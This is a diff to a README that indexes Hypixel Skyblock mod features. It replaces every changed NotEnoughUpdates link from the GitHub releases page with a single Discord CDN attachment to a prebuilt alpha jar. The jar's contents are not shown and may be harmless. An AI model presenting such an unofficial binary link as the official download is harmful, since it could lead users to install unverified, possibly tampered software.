@@ -23,8 +23,8 @@ or a discussion.
 
 * Timestamps - [Sk1er's Patcher](https://sk1er.club/mods/patcher)
 * Show Milestones - ?
-* Show Auction Data - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
-* Century Cake Timer - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
+* Show Auction Data - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
+* Century Cake Timer - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 * Larger Heads - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Big Items - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Scale with Rarity - ?
@@ -33,13 +33,13 @@ or a discussion.
 
 * Announce Rare Drops - Skytils?
 * Copy Rare Drops - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
-* Dark Auction Warning - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Dark Auction Warning - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Golem Warning - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 * Jerry Warning - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 
 ### Experimentation
 
-* Experimentation Helper - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
+* Experimentation Helper - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 
 ### Rarity Colors
 
@@ -52,20 +52,20 @@ or a discussion.
 * Mute Wind Changes - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Raffle Timer Warning - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Gourmand Time Warning - ?
-* Puzzler Solver - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) / [Cobble8's SkyblockPersonalized](https://github.com/Cobble8/SkyblockPersonalized/releases/latest)
-* Puzzler Timer - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Mine Waypoints - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Area Waypoints - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Target Waypoints - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Puzzler Solver - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) / [Cobble8's SkyblockPersonalized](https://github.com/Cobble8/SkyblockPersonalized/releases/latest)
+* Puzzler Timer - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Mine Waypoints - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Area Waypoints - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Target Waypoints - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Notify Ability Cooldown - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) (/trackcooldown)
-* Show Fuel Display - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Cobble8's SkyblockPersonalized](https://github.com/Cobble8/SkyblockPersonalized/releases/latest)
+* Show Fuel Display - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Cobble8's SkyblockPersonalized](https://github.com/Cobble8/SkyblockPersonalized/releases/latest)
 * Show Compact Features - ?
-* Show Forge Timer - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Commissions Tracker - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Mining Tracker - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Show Forge Timer - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Commissions Tracker - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Mining Tracker - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Show Star Cult Timer - SBP?
 * Show Events Display - [Cobble8's SkyblockPersonalized](https://github.com/Cobble8/SkyblockPersonalized/releases/latest)
-* Show Titanium Warning - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Show Titanium Warning - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Show Golden Goblin Warning - ?
 * Show Skymall Warning - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 
@@ -83,10 +83,10 @@ or a discussion.
 * Show Breadcrumbs in Hollows - [Cobble8's SkyblockPersonalized](https://github.com/Cobble8/SkyblockPersonalized/releases/latest)
 * Use Footstep Particles - ?
 * Show Mining Pass Duration - ?
-* Show Automaton Parts - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Show Automaton Parts - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Treasure Chest Helper - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
-* Metal Detector Locator - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Metal Detector Waypoint - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Metal Detector Locator - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Metal Detector Waypoint - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Auto Renew Mining Pass - ?
 * Worm Notifier Warning - ?
 
@@ -151,25 +151,25 @@ or a discussion.
 
 ### Fishing QOL
 
-* Hide Fishing Rods - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
-* Show Expertise Kills - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
+* Hide Fishing Rods - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
+* Show Expertise Kills - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 
 ### Fishing Utilities
 
 * Show Dolphin Pet Display - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Spider's Den Rain Timer - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
-* Fishing Timer - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
+* Fishing Timer - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 
 ### Skills
 
 * Revert EXP Display - ?
-* Show Custom Skill Display - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Skill Trackers - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
-* Show EXP Rate - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
+* Show Custom Skill Display - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Skill Trackers - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
+* Show EXP Rate - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 * Show Time Change - [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 * Show Actions Needed - [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
-* Show Time Needed - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
-* Show Total Information - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
+* Show Time Needed - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
+* Show Total Information - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 
 ### Mythos
 
@@ -186,20 +186,20 @@ or a discussion.
 
 * Show Golem Counter - ?
 * Show Dragon Counter - ?
-* Show Farming Counter - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Show Farming Counter - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Show Ghost Counter - [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 * Show Legion Counter - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 
 ## Pets
 
 * Pet Colors - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
-* Show Active Pet - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) / [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Show Active Pet - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) / [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Show EXP-Shared Pets - ?
 * AutoPet Enabled Colors - ?
 
 ### Pet Display
 
-* Pet Display - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Pet Display - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 
 ### General
 
@@ -215,10 +215,10 @@ or a discussion.
 
 * Show Dungeon Counter - [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 * Edit Dungeon Floor - [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
-* Show Dungeon Profit - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) / [Syeyoung's DungeonGuide](https://github.com/Dungeons-Guide/Skyblock-Dungeons-Guide/releases/latest)
+* Show Dungeon Profit - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) / [Syeyoung's DungeonGuide](https://github.com/Dungeons-Guide/Skyblock-Dungeons-Guide/releases/latest)
 * Show Frag Counter - SkyblockHud?
 * Show Door Opener - ?
-* Show Dungeon Map - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Syeyoung's DungeonGuide](https://github.com/Dungeons-Guide/Skyblock-Dungeons-Guide/releases/latest) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
+* Show Dungeon Map - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Syeyoung's DungeonGuide](https://github.com/Dungeons-Guide/Skyblock-Dungeons-Guide/releases/latest) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Remove Armor Stands - [Sk1er's Patcher](https://sk1er.club/mods/patcher)
 * Show Crypts Counter - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 
@@ -239,7 +239,7 @@ or a discussion.
 
 ### Miscellaneous
 
-* Fix Spirit Boots - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
+* Fix Spirit Boots - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Danker's DSM](https://github.com/bowser0000/SkyblockMod/releases/latest)
 * Copy Fails - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Show Armor Color - ?
 * Show Item Quality - [Cow's Cowlection](https://github.com/cow-mc/Cowlection/releases/latest) / [Syeyoung's DungeonGuide](https://github.com/Dungeons-Guide/Skyblock-Dungeons-Guide/releases/latest)
@@ -255,7 +255,7 @@ or a discussion.
 ### General
 
 * Customize Custom Commands - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
-* Search Bar - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Search Bar - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Middle Click SB Menu - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Hide Item Durability - ?
 * Better Crop Hitboxes - [Sk1er's Patcher](https://sk1er.club/mods/patcher)
@@ -266,24 +266,24 @@ or a discussion.
 
 ### Visual
 
-* Color Enchants - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Color Enchants - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Show Selected Arrow - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Freeze Previews - ?
-* Show Storage Previews - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Cache Backpack Data - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Custom Backpack Name - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Ender Chest Previews - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Custom Ender Chest Names - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Show Block Zapper Destroyed Blocks - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Show Storage Previews - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Cache Backpack Data - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Custom Backpack Name - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Ender Chest Previews - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Custom Ender Chest Names - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Show Block Zapper Destroyed Blocks - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Hub Colors - ?
-* Prettify Damage Markings - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
-* Show Custom Dyed Armor - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
-* Show Custom Skull Textures - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Prettify Damage Markings - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
+* Show Custom Dyed Armor - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
+* Show Custom Skull Textures - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Show Enchant Glow - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Remove Enchant Glow - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Hide Fire Display - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Hide Lightning - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
-* Show Builder's Wand Overlay - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Show Builder's Wand Overlay - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Hide WitherBorn Shadows - [Sk1er's Patcher](https://sk1er.club/mods/patcher) (properly scales shadows) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest) (for bossbar)
 * Hide Displayed Armor - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Show Damage Vignette - ?
@@ -311,7 +311,7 @@ or a discussion.
 ### Misc
 
 * Show Damage Calculations - ?
-* Compact Damage Text - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
+* Compact Damage Text - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 
 ### Use At Your Own Risk
 
@@ -327,6 +327,7 @@ or a discussion.
 * [Angry_Pineapple](https://github.com/Angry-Pineapple3121)
 * [AzuredBlue](https://github.com/AzuredBlue)
 * [bumble](https://github.com/itsbumble)
+* [CalMWolfs](https://github.com/CalMWolfs)
 * [DJtheRedstoner](https://github.com/DJtheRedstoner)
 * [Feel65](https://github.com/Feel65)
 * [jani270](https://github.com/jani270)
